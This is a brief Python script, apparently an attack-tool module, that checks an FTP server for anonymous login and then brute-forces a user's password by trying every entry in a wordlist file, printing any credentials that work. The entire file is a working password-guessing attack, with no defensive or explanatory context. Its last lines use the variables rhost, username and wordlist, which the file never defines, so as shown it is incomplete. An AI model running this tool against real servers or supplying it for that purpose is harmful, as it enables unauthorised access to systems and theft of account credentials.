#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
from ftplib import FTP


def check_anonymous_login(target):
    try:
        ftp = FTP(target)
        ftp.login()
        print("\n[+] Anonymous login is open.")
        print("\n[+] Username : anonymous")
        print("\n[+] Password : anonymous\n")
        ftp.quit()
    except:
        pass


def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print("\n[!] Credentials have found.")
        print("\n[!] Username : {}".format(username))
        print("\n[!] Password : {}".format(password))
        sys.exit(0)
    except:
        pass


def brute_force(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftp_login(target, username, word)

    except:
        print("\n[-] There is no such wordlist file. \n")
        sys.exit(0)



brute_force(rhost , username, wordlist)
check_anonymous_login(rhost)
print("\n[-] Brute force finished. \n")